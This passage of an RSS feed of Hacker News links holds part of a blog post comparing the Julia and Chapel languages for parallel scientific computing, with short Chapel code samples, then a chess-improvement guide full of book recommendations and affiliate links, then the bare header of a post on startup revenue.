fast, vectorized native code.  This code-is-data aspect of Julia,
combined with the fact that much of Julia itself is written in Julia,
puts user-written code on an equal footing with much “official”
julia code.</p>

<p>The second way Julia blurs the line between user and developer is
the <a href="https://docs.julialang.org/en/stable/manual/packages/">package system</a>
which uses git and GitHub; this means that once you’ve installed
someone’s package, you’re very close to being able to file a pull
request if you find a bug, or to fork the package to specialize
it to your own needs; and it’s similarly very easy to
contribute a package if you’re already using GitHub to develop the
package.</p>

<p>Julia has support for remote function execution (“out of the box”
using SSH + TCP/IP, but other transports are available through
packages), and distributed rectangular arrays; thread support
is still experimental, as is shared-memory on-node arrays.</p>

<h3 id="chapel">Chapel</h3>

<p>While Julia is a scientific programming language with parallel
computing support, Chapel is a programming language for parallel
scientific computing. It is a <a href="https://en.wikipedia.org/wiki/Partitioned_global_address_space">PGAS</a>
language, with partitioned but globally-accessible variables, using
<a href="https://gasnet.lbl.gov/">GASNet</a> for communications.  It takes PGAS
two steps further however than languages like <a href="https://www.dursi.ca/post/coarray-fortran-goes-mainstream-gcc-5-1.html">Coarray
Fortran</a>,
<a href="http://upc.lbl.gov/">UPC</a>, or <a href="http://x10-lang.org/">X10</a>.</p>

<p>The first extension is to define all large data structures (arrays,
associative arrays, graphs) as being defined over <em>domains</em>, and
then definining a library of <em>domain maps</em> for distributing these
domains over different locality regions (“locales”) (nodes, or NUMA
nodes, or KNL accellerators) and <em>layouts</em> for describing their layout
within a locale.  By far the best tested and optimized domain maps
are for the cases of dense (and to a lesser extent, CSR-layout
sparse) rectangular arrays, as below, although there support for
associative arrays (dictionaries) and unstructured meshes/graphs
as well.</p>

<p>The second is to couple those domain maps with parallel iterators
over the domains, meaning that one can loop over the data in parallel
in one loop (think OpenMP) with a “global view” rather than expressing
the parallelism explicitly as a SIMD-type program.  This decouples
the expression of the layout of the data from the expression of the
calculation over the data, which is essential for productive parallel 
computing; it means that tweaking the layouts (or the dimensionality of
the program, or…) doesn’t require rewriting the internals of the
computation.</p>

<p>The distributions and layouts are written in Chapel, so that users can
contribute new domain maps to the project.</p>

<table>
<tbody>
<tr> <td>
Example from <a href="http://chapel.cray.com/tutorials/ACCU2017/06-DomainMaps.pdf">Chapel tutorial at ACCU 2017</a>
</td> </tr>
<tr> <td>

<figure><pre><code data-lang="chapel">var Dom: {1..4, 1..8} dmapped Block({1..4, 1..8});</code></pre></figure>

</td> </tr>
<tr> <td>
<img src="https://www.dursi.ca/assets/julia_v_chapel/block-dist.png" alt="Block Distribution">
</td> </tr>
<tr> <td>

<figure><pre><code data-lang="chapel">var Dom: {1..4, 1..8} dmapped Cyclic(startIdx=(1,1));</code></pre></figure>

</td> </tr>
<tr> <td>
<img src="https://www.dursi.ca/assets/julia_v_chapel/cyclic-dist.png" alt="Block Distribution">
</td> </tr>
<tr> <td>

<figure><pre><code data-lang="chapel">// either case:

var Inner : subdomain(Dom) = {2..3, 2..7};
const north = (-1,0), south = (1,0), east = (0,1), west = (0,-1);

var data, data_new : [Dom] real;
var delta : real;

forall ij in Inner {
    data_new(ij) = (data(ij+north) + data(ij+south)
                    + data(ij+east) + data(ij+west)) / 4.0;
}
delta = max reduce abs(data_new[Dom] - data[Dom]);</code></pre></figure>

</td> </tr>
</tbody>
</table>

<p>Chapel also exposes its lower-level parallel computing functionality —
such as remote function execution, fork/join task parallelism — so
that one can write a MPI-like SIMD program by explicity launching 
a function on each core:</p>

<figure><pre><code data-lang="chapel">coforall loc in Locales do 
    on loc do
        coforall tid in 0..#here.maxTaskPar do
            do_simd_program(loc, tid);</code></pre></figure>

<p>At roughly eight years old as a publically available project, Chapel
is a slightly older and more mature language than Julia. However,
the language continues to evolve and there are breaking changes
between versions; these are much smaller and more localized breaking
changes than with Julia, so that most recent example code online
works readily.  As its focus has always been on large-scale parallelism
rather than desktop computing, its potential market is smaller
so has attracted less interest and fewer users than Julia
— however, if you read this blog, Chapel’s niche is one you are
almost certainly very interested in.  The relative paucity of users
is reflected in the smaller number of contributed packages, although
an upcoming package manager will likely lower the bar to future
contributions.</p>

<p>Chapel also lacks a REPL, which makes experimentation and testing
somewhat harder — there’s no equivalent of <a href="https://juliabox.com/">JuliaBox</a>
where one can play with the language at a console or in a notebook.
There is an effort in that direction now which may be made easier
by ongoing work on the underlying compiler architecture.</p>

<h2 id="similarities-and-differences">Similarities and differences</h2>

<h3 id="standard-library">Standard library</h3>

<p>Both <a href="https://docs.julialang.org/en/stable">Julia</a> and <a href="http://chapel.cray.com/docs/latest/">Chapel</a>
have good documentation, and the basic modules or capabilities one would expect from languages 
aimed at technical computing:</p>

<ul>
  <li>Complex numbers</li>
  <li>Mathematical function libraries</li>
  <li>Random numbers</li>
  <li>Linear algebra</li>
  <li>FFTs</li>
  <li>C, Python interoperability</li>
  <li>Multi-precision floats / BigInts</li>
  <li>MPI interoperability</li>
  <li>Profiling</li>
</ul>

<p>although there are differences - in Julia, Python interoperability
is much more complete (the Julia set example above used matplotlib
plotting, while <a href="https://pychapel.readthedocs.io/">pychapel</a> focuses
on calling Chapel from within python).  Also, Julia’s linear algebra
support is much slicker, styled after Matlab syntax and with a rich
set of matrix types (symmetric, tridiagonal, <em>etc.</em>), so that for
linear solves, say, a sensible method is chosen automatically; the
consise syntax and “do the right thing” approach are particularly
helpful for interactive use<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>, which is a primary use-case of Julia.</p>

<p>On profiling, the Julia support is primariy for serial profiling
and text based; Chapel has a very nice tool called
<a href="http://chapel.cray.com/docs/1.14/tools/chplvis/chplvis.html">chplvis</a> 
for visualizing parallel performance.</p>

<h3 id="other-packages">Other packages</h3>

<p>Julia’s early adoption of a package management framework and very
large initial userbase has lead to a <a href="http://pkg.julialang.org/">very large ecosystem</a>
of contributed packages.  As with all such package ecosystems, 
the packages themselves are a bit of a mixed bag – lots are broken or
abandoned, many are simply wrappers to other tools – but there
are also excellent, substantial packages taking full advantage of
Julia’s capabalities that are of immediate interest
to those doing scientific computing, such as 
<a href="https://github.com/JuliaDiffEq/DifferentialEquations.jl">DifferentialEquations.jl</a>
for ODEs, SDEs, and and FEM for some PDEs,
<a href="https://github.com/BioJulia">BioJulia</a> for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dursi.ca/post/julia-vs-chapel.html">https://www.dursi.ca/post/julia-vs-chapel.html</a></em></p>]]>
            </description>
            <link>https://www.dursi.ca/post/julia-vs-chapel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25020131</guid>
            <pubDate>Sat, 07 Nov 2020 22:19:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get Good at Chess, Fast (2013)]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25020036">thread link</a>) | @spekcular
<br/>
November 7, 2020 | https://www.gautamnarula.com/how-to-get-good-at-chess-fast/ | <a href="https://web.archive.org/web/*/https://www.gautamnarula.com/how-to-get-good-at-chess-fast/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><em>Edit: This article on chess improvement was unexpectedly popular, reaching #2 on Hacker News and being linked to on LifeHacker. Thanks for your patience as I work through all the comments and emails I receive.<br>
</em></p>
<p>Last updated: October 1, 2020</p>
<p>There are many misconceptions about rapid chess improvement. In this post I’m going to lay out a simple but effective way to get good at chess, fast.</p>
<p>This system is based on lessons learned from my own chess improvement and from coaching others. The good news is that you can become better than the vast majority of other players with minimal but targeted effort.</p>
<p><b>What does it mean to be “good” at chess? </b></p>
<p><span><span><a href="https://en.wikipedia.org/wiki/Magnus_Carlsen">Magnus Carlsen’s</a></span></span> meteoric rise to the top ranked player in the world (at age 19), the highest chess rating in history (age 22), and as of a few days ago, the title of World Chess Champion (age 22) has brought with it a renewed interest in chess. This is exciting, because Carlsen represents the first real hope of renewing chess’s mass appeal since the days of <span><span><a href="https://en.wikipedia.org/wiki/Bobby_Fischer">Bobby Fischer</a></span></span><sup>1</sup>.</p>
<p>In the context of discussions about Magnus Carlsen, many people mentioned that they enjoyed playing chess but quit because of the sheer time commitment it took to get “good.”</p>
<p>I define “good” as the 90<sup>th</sup> percentile among the player pool you’re competing against. In competitive chess in the United States, that means a United States Chess Federation (USCF) <span><span><a href="https://en.wikipedia.org/wiki/Elo_rating">Elo rating</a></span></span> of about 1800<sup>2</sup>. If you’re a casual player playing against your friends, my guess is that 90<sup>th</sup> percentile is around 900. Even though I was only rated 1100 when I first began playing competitively, I was already able to beat the vast majority of non-competitive players.</p>
<p>The goal here is to help you get good, fast, with minimal effort.</p>
<p><b>Results with this system</b></p>
<p>I actively trained for a period of about 3.5 years using a (much, much less disciplined) version of this system, during which my rating increased from 1100 to 1950, a 135 fold increase I strength<sup>3</sup>. In one 12 month period I improved from 1198 to 1639. I improved even faster with my quick rating (games with less than 30 minutes per side), where I went from 1001 to 1740 in 15 months (75 fold increase in playing strength).</p>
<p>My first experience using these ideas with other players was in high school, when I began coaching the lowest ranked player in our chess club. Within a few months he had improved so rapidly that he represented the school in the state championships and won every single game in the tournament.</p>
<p>Given that I managed to do this despite my own inexperience and mistakes with studying chess and my own laziness, I’m convinced others can improve much more quickly if they follow this system strictly<sup>4</sup>.</p>
<p><b>The system</b></p>
<p>Since this article is meant for both casual and competitive players, I specify minimum rating requirements when appropriate. If you’re a casual player and this is overkill for your goals, skip to the footnotes for a much simpler system<sup>5</sup>.</p>
<p><span>Playing</span></p>
<p>To improve quickly you need to play often. If you are (or aspire to be) a competitive player, play as many over-the-board (OTB) tournaments as possible. In my heyday I played 3-4 tournaments per month. Online is not enough! Use online games (15 minutes per side or slower) to practice openings or for practice if there is no tournament for a while. If you’re a casual player, play OTB chess with your friends as much as you can, and play online if nobody wants to play with you.</p>
<p>Since I first wrote this post, I’ve received a fair number of questions asking why OTB chess is so important and why online-only is insufficient. IM Andras Toth has <a href="https://www.youtube.com/watch?v=_kmdFbyWiTY">an excellent discussion</a> of this topic that explains it better than I could&nbsp; (his channel is also chronically underrated–I highly recommend checking his other videos out!).</p>
<p><span>Tactics</span></p>
<p>I did two types of tactics training. The first was “Chess Vision” and “Knight Sight” exercises, as described in <span><a href="http://www.masschess.org/Chess_Horizons/Articles/2001-01_Sample_400_Points_Part_1.pdf">this article</a></span>. They may sound stupid, but they work. I did these exercises every day for two weeks initially, and then would do them the day of a tournament and once in a while as a refresher.</p>
<p>My primary method of tactics training was using <a href="https://www.amazon.com/gp/product/B004U0YZ0M/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B004U0YZ0M&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=Y76EOXPI5OJF2DV4">Chess Tactics for Beginners</a>, which is absolutely fantastic. Since it may have compatibility issues with modern OSes, a good alternative is CT Art 4.0 available for both <a href="https://play.google.com/store/apps/details?id=com.chessking.android.learn.ctart4&amp;hl=en_US">Android</a> and <a href="https://apps.apple.com/us/app/ct-art-4-0-chess-tactics/id1132601225">iOS</a>.</p>
<p><a href="https://www.amazon.com/gp/product/B004U0YZ0M/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B004U0YZ0M&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=J7V5XFOTBIDIIG2C" target="_blank" rel="noopener noreferrer"><img loading="lazy" src="https://i1.wp.com/ecx.images-amazon.com/images/I/6105Zn3iBeL._SL1000_.jpg?resize=278%2C278&amp;ssl=1" alt="" width="278" height="278" data-recalc-dims="1"></a></p>
<p>If you only buy one thing to help your chess game, this should be it. I did 50 puzzles per day, every day, and once I finished the entire CD I repeated the process six more times. Online tactics sites usually don’t cut it, because they aren’t structured so that you learn based off previous ideas and many don’t incorporate the pedagogical features of Chess Tactics for Beginners/CT Art 4.0. Trust me, paying for the software is worth it.</p>
<p>If I had to recommend a book to accompany such study (which is helpful, since the above software doesn’t actually have any explanatory text), I’d recommend <a href="https://www.amazon.com/gp/product/1889323276?ie=UTF8&amp;camp=1789&amp;creativeASIN=1889323276&amp;linkCode=xm2&amp;tag=gautnaru-20" target="_blank" rel="noopener noreferrer">Chess Tactics for the Tournament Player </a>for intermediate players, and <a href="https://www.amazon.com/gp/product/1857443861/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=390957&amp;creativeASIN=1857443861&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=7ALJB5A3ECUHWDEW" target="_blank" rel="noopener noreferrer">Winning Chess Tactics</a> for less experienced players.</p>
<p><a href="https://www.amazon.com/gp/product/1889323276?ie=UTF8&amp;camp=1789&amp;creativeASIN=1889323276&amp;linkCode=xm2&amp;tag=gautnaru-20">&nbsp;&nbsp;&nbsp; </a><a href="https://www.amazon.com/gp/product/1889323276?ie=UTF8&amp;camp=1789&amp;creativeASIN=1889323276&amp;linkCode=xm2&amp;tag=gautnaru-20" target="_blank" rel="noopener noreferrer"><img loading="lazy" id="imgBlkFront" src="https://i1.wp.com/ecx.images-amazon.com/images/I/51zU34AQ%2BOL._SX323_BO1,204,203,200_.jpg?resize=290%2C445&amp;ssl=1" alt="" width="290" height="445" data-a-dynamic-image="{&quot;http://ecx.images-amazon.com/images/I/51zU34AQ%2BOL._SY344_BO1,204,203,200_.jpg&quot;:[226,346],&quot;http://ecx.images-amazon.com/images/I/51zU34AQ%2BOL._SX323_BO1,204,203,200_.jpg&quot;:[325,499]}" data-recalc-dims="1"></a><a href="https://www.amazon.com/gp/product/1857443861/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=390957&amp;creativeASIN=1857443861&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=7ALJB5A3ECUHWDEW" target="_blank" rel="noopener noreferrer"> &nbsp; &nbsp;&nbsp; <img loading="lazy" id="imgBlkFront" src="https://i0.wp.com/ecx.images-amazon.com/images/I/51ISp9Y-ATL._SX398_BO1,204,203,200_.jpg?resize=322%2C403&amp;ssl=1" alt="" width="322" height="403" data-a-dynamic-image="{&quot;http://ecx.images-amazon.com/images/I/51ISp9Y-ATL._SX258_BO1,204,203,200_.jpg&quot;:[260,325],&quot;http://ecx.images-amazon.com/images/I/51ISp9Y-ATL._SX398_BO1,204,203,200_.jpg&quot;:[400,500]}" data-recalc-dims="1"></a></p>
<p>I’ll admit, there is a bit of a leap between solving tactics puzzles and applying it to real games–obviously nobody’s going to tell you when a tactic is available, and you won’t be “primed” to find tactics the way you would be when solving a bunch of puzzles. To counteract this I created a binder of puzzles taken from tactics I missed in my games, and reviewed them from time to time.</p>
<p><span>Analysis</span></p>
<p>Analysis is by far the most undervalued part of chess training. As a kid I barely analyzed my games after tournaments, because I was lazy. This was a huge mistake—your games are worth their weight in gold! Learn <span><span><a href="https://en.wikipedia.org/wiki/Algebraic_notation_(chess)">algebraic chess notation</a></span></span> so you can write down your moves, and analyze your games using the method outlined in <span><span><a href="https://www.chess.com/blog/CharlyAZ/a-hardcore-guide-to-analyze-your-chess-games">this article</a></span></span>. Use the analysis phase to brush up on your openings and endgames and practice your strategic play. If possible, have a stronger player go over your games with you after you’ve done your own analysis.</p>
<p>One big mistake is to rely heavily on computers for chess analysis. Too often, players use computers as a crutch to replace their own study of the game. Working through games on your own and trying to find the best moves and ideas is highly instructive. Computer analysis should be done only after you analyze the game on your own, so you can compare your analysis to the computer’s and unearth any mistakes you made in assessing critical positions in the game.</p>
<p><span>Openings</span><b> </b></p>
<p>One of the biggest mistakes players make is to devote massive amounts of time to openings. This is because openings tend to be very concrete, and beginners think that simply memorizing an opening will give them an unassailable advantage over their opponents<sup>6</sup>.</p>
<p>Don’t bother spending any time studying openings outside of analyzing your games. Just make sure you know the basic opening principles. I teach my beginning students simple openings like the <span><span><a href="https://en.wikipedia.org/wiki/London_System">London System </a></span></span>as white, and a kingside fianchetto system as black<sup>7</sup>. These openings are simple, solid, can be played against virtually anything.</p>
<p>Once you hit 1600, get a good opening book that gives you both specific moves and the ideas behind the opening. Don’t mindlessly memorize!</p>
<p><em>Openings for White</em></p>
<p>If you’re a d4 player, I highly recommend Cox’s <a href="https://www.amazon.com/gp/product/1857444175/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1857444175&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=STJDQXBM7GK6XYNM" target="_blank" rel="noopener noreferrer">Starting Out: 1. d4!</a><sup>8</sup>. An offbeat alternative is Summerscale’s <a href="https://amzn.to/36pGkPS">A Killer Chess Opening Repertoire</a>.</p>
<p>If you’re an e4 player it gets a bit trickier. The truth is, e4 is simply harder to play than d4 because it’s a lot easier to get in trouble if you don’t play precisely. This makes finding a single volume repertoire book a bit more challening, but here are some options:</p>
<ul>
<li>Alburt’s<a href="https://www.amazon.com/gp/product/1889323209/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1889323209&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=AF3LPY4VTPCU6ID3"> Chess Openings for White, Explained.</a> I haven’t personally used it, and I’ve heard some reasonable criticism around some of the lines chosen, but I think for most players it’ll probably be a good starting point.</li>
<li>Emms’s <a href="https://www.amazon.com/gp/product/B00ZA2DM12/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B00ZA2DM12&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=dcee712605ab0911a0fafd2bf00b1532">Attacking with 1. e4</a> is a book I have used and enjoyed during my forays as an e4 player.</li>
</ul>
<p>If you’re a c4 player, you’ll have to do some research on your own to find a good repertoire book. Being a hipster has its downsides.</p>
<p><em>Openings for Black</em></p>
<ul>
<li>Alburt’s <a href="https://www.amazon.com/gp/product/1889323187/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1889323187&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=PBISMJGJT42NGJX6">Chess Openings for Black, Explained</a> is a great book.</li>
</ul>
<p><a href="https://www.amazon.com/gp/product/1857444175/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1857444175&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=STJDQXBM7GK6XYNM"> &nbsp;&nbsp; </a><a href="https://www.amazon.com/gp/product/1857444175/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1857444175&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=STJDQXBM7GK6XYNM" target="_blank" rel="noopener noreferrer"><img loading="lazy" id="imgBlkFront" src="https://i1.wp.com/ecx.images-amazon.com/images/I/51qe4nRkrzL._SX329_BO1,204,203,200_.jpg?resize=300%2C452&amp;ssl=1" alt="" width="300" height="452" data-a-dynamic-image="{&quot;http://ecx.images-amazon.com/images/I/51qe4nRkrzL._SX329_BO1,204,203,200_.jpg&quot;:[331,499],&quot;http://ecx.images-amazon.com/images/I/51qe4nRkrzL._SY344_BO1,204,203,200_.jpg&quot;:[230,346]}" data-recalc-dims="1"></a><a href="https://www.amazon.com/gp/product/1889323187/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1889323187&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=PBISMJGJT42NGJX6"> &nbsp;&nbsp; &nbsp; &nbsp; </a><a href="https://www.amazon.com/gp/product/1889323187/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1889323187&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=PBISMJGJT42NGJX6" target="_blank" rel="noopener noreferrer"><img loading="lazy" id="imgBlkFront" src="https://i1.wp.com/ecx.images-amazon.com/images/I/515HExt56YL._SX331_BO1,204,203,200_.jpg?resize=306%2C459&amp;ssl=1" alt="" width="306" height="459" data-a-dynamic-image="{&quot;http://ecx.images-amazon.com/images/I/515HExt56YL._SX331_BO1,204,203,200_.jpg&quot;:[333,499],&quot;http://ecx.images-amazon.com/images/I/515HExt56YL._SY344_BO1,204,203,200_.jpg&quot;:[231,346]}" data-recalc-dims="1"></a></p>
<p>Obviously this depends on your opening preferences. Even here openings should not be your main focus. I only consult these books when analyzing my games to see where I deviated from established opening theory, occasionally supplemented by a chess database if there’s a line not covered in the book or I’d like to go more in-depth.</p>
<p>And if your first thought is, “Gautam, one of those books was published in 2006! I’ll be using outdated opening theory!” then I’m afraid you’re missing the point. If you’re below master or even International Master level, playing what world champions played in 2006 rather than what they played in 2020 will <em>never</em> be the reason you lose a game. Ever. That simply is not your bottleneck, and the time invested to try to constantly keep up with the latest won’t result in any rating gains.</p>
<p><span>Strategy<br>
</span></p>
<p>Until you hit 1400-1500, you should be picking up strategic play from analyzing your games and going over annotated games. Once you hit that level, I recommend Silman’s <a href="https://www.amazon.com/gp/product/1890085022/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1890085022&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=5GKXCF6U4LWI7Y24" target="_blank" rel="noopener noreferrer">The Amateur’s Mind</a> and Seirawan’s <a href="https://www.amazon.com/gp/product/1857443853/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1857443853&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=V5IEYHJJ5PL3FC6Q" target="_blank" rel="noopener noreferrer">Winning Chess Strategies.&nbsp;</a></p>
<p><a href="https://www.amazon.com/gp/product/1890085022/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1890085022&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=5GKXCF6U4LWI7Y24">&nbsp;&nbsp; </a><a href="https://www.amazon.com/gp/product/1890085022/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1890085022&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=5GKXCF6U4LWI7Y24" target="_blank" rel="noopener noreferrer"><img loading="lazy" id="imgBlkFront" src="https://i0.wp.com/ecx.images-amazon.com/images/I/51EZ9QBPN9L._SX340_BO1,204,203,200_.jpg?resize=284%2C415&amp;ssl=1" alt="" width="284" height="415" data-a-dynamic-image="{&quot;http://ecx.images-amazon.com/images/I/51EZ9QBPN9L._SY344_BO1,204,203,200_.jpg&quot;:[237,346],&quot;http://ecx.images-amazon.com/images/I/51EZ9QBPN9L._SX340_BO1,204,203,200_.jpg&quot;:[342,499]}" data-recalc-dims="1"></a><a href="https://www.amazon.com/gp/product/1857443853/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1857443853&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=V5IEYHJJ5PL3FC6Q" target="_blank" rel="noopener noreferrer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img loading="lazy" id="imgBlkFront" src="https://i2.wp.com/ecx.images-amazon.com/images/I/51O9bBRKCzL._SX392_BO1,204,203,200_.jpg?resize=324%2C410&amp;ssl=1" alt="" width="324" height="410" data-a-dynamic-image="{&quot;http://ecx.images-amazon.com/images/I/51O9bBRKCzL._SX258_BO1,204,203,200_.jpg&quot;:[260,329],&quot;http://ecx.images-amazon.com/images/I/51O9bBRKCzL._SX392_BO1,204,203,200_.jpg&quot;:[394,499]}" data-recalc-dims="1"></a></p>
<p>Once you hit 1800, <a href="https://www.amazon.com/gp/product/1890085138/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1890085138&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=2TUB27GQ6MOMAYRT" target="_blank" rel="noopener noreferrer">Silman’s Reassess Your Chess, Fourth Edition</a>.</p>
<p><a href="https://www.amazon.com/gp/product/1890085138/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1890085138&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=2TUB27GQ6MOMAYRT" target="_blank" rel="noopener noreferrer"><img loading="lazy" id="imgBlkFront" src="https://i2.wp.com/ecx.images-amazon.com/images/I/51luxFAgz6L._SX348_BO1,204,203,200_.jpg?resize=350%2C499&amp;ssl=1" alt="" width="350" height="499" data-a-dynamic-image="{&quot;http://ecx.images-amazon.com/images/I/51luxFAgz6L._SX348_BO1,204,203,200_.jpg&quot;:[350,499],&quot;http://ecx.images-amazon.com/images/I/51luxFAgz6L._SY344_BO1,204,203,200_.jpg&quot;:[243,346]}" data-recalc-dims="1"></a></p>
<p><span>Endgame</span></p>
<p>After learning the basic checkmates (King and Queen vs. King, King and Rook vs. King, etc.), <a href="https://www.amazon.com/gp/product/1890085103/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1890085103&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=B7XX3NKSQ3PENDNU" target="_blank" rel="noopener noreferrer">Silman’s Complete Endgame Course</a> is the only book you need. Study the appropriate section based on your rating, and only come back to it if it’s clear that you keep messing up endgames.</p>
<p><a href="https://www.amazon.com/gp/product/1890085103/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1890085103&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=B7XX3NKSQ3PENDNU" target="_blank" rel="noopener noreferrer"><img loading="lazy" src="https://i0.wp.com/d.gr-assets.com/books/1348296214l/83337.jpg?resize=280%2C400&amp;ssl=1" alt="" width="280" height="400" data-recalc-dims="1"></a></p>
<p><span>Annotated Games</span></p>
<p>Go over at least one annotated game a week (and more frequently if you’re a serious competitive player). A good annotated game book is <a href="https://www.amazon.com/gp/product/1857443470/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1857443470&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=SWT4HHD4X4F3H2XB" target="_blank" rel="noopener noreferrer">Winning Chess Brilliancies</a> by Seirawan. I hear the <a href="https://www.amazon.com/gp/product/0762439955/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0762439955&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=MOTVUMZGF5OZXYD5" target="_blank" rel="noopener noreferrer">Mammoth Book of the World’s Greatest Chess Games</a> is pretty good too, but I can’t personally vouch for it.</p>
<p><a href="https://www.amazon.com/gp/product/1857443470/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1857443470&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=SWT4HHD4X4F3H2XB">&nbsp; &nbsp; &nbsp; </a><a href="https://www.amazon.com/gp/product/1857443470/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1857443470&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=SWT4HHD4X4F3H2XB" target="_blank" rel="noopener noreferrer"><img loading="lazy" id="imgBlkFront" src="https://i1.wp.com/ecx.images-amazon.com/images/I/51s0ZaO0WDL._SX399_BO1,204,203,200_.jpg?resize=310%2C387&amp;ssl=1" alt="" width="310" height="387" data-a-dynamic-image="{&quot;http://ecx.images-amazon.com/images/I/51s0ZaO0WDL._SX258_BO1,204,203,200_.jpg&quot;:[260,324],&quot;http://ecx.images-amazon.com/images/I/51s0ZaO0WDL._SX399_BO1,204,203,200_.jpg&quot;:[401,500]}" data-recalc-dims="1"></a><a href="https://www.amazon.com/gp/product/0762439955/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0762439955&amp;linkCode=as2&amp;tag=gautnaru-20&amp;linkId=MOTVUMZGF5OZXYD5" target="_blank" rel="noopener noreferrer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img loading="lazy" id="imgBlkFront" src="https://i1.wp.com/ecx.images-amazon.com/images/I/51FE6WIn3aL._SX328_BO1,204,203,200_.jpg?resize=269%2C407&amp;ssl=1" alt="" width="269" height="407" data-a-dynamic-image="{&quot;http://ecx.images-amazon.com/images/I/51FE6WIn3aL._SX328_BO1,204,203,200_.jpg&quot;:[330,499],&quot;http://ecx.images-amazon.com/images/I/51FE6WIn3aL._SY344_BO1,204,203,200_.jpg&quot;:[229,346]}" data-recalc-dims="1"></a></p>
<p><span>Psychology</span></p>
<p>Magnus Carlsen is my favorite chess player. In equal positions where many …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.gautamnarula.com/how-to-get-good-at-chess-fast/">https://www.gautamnarula.com/how-to-get-good-at-chess-fast/</a></em></p>]]>
            </description>
            <link>https://www.gautamnarula.com/how-to-get-good-at-chess-fast/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25020036</guid>
            <pubDate>Sat, 07 Nov 2020 22:08:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Going from $0 to $2M ARR in 2 years]]>
            </title>
            <description>
<![CDATA[
Score 164 | Comments 42 (<a href="https://news.ycombinator.com/item?id=25019737">thread link</a>) | @gatsby
<br/>
November 7, 2020 | https://laskie.co/playbooks/bootstrapping-b2b-sales | <a href="https://web.archive.org/web/*/https://laskie.co/playbooks/bootstrapping-b2b-sales">archive.org</a>
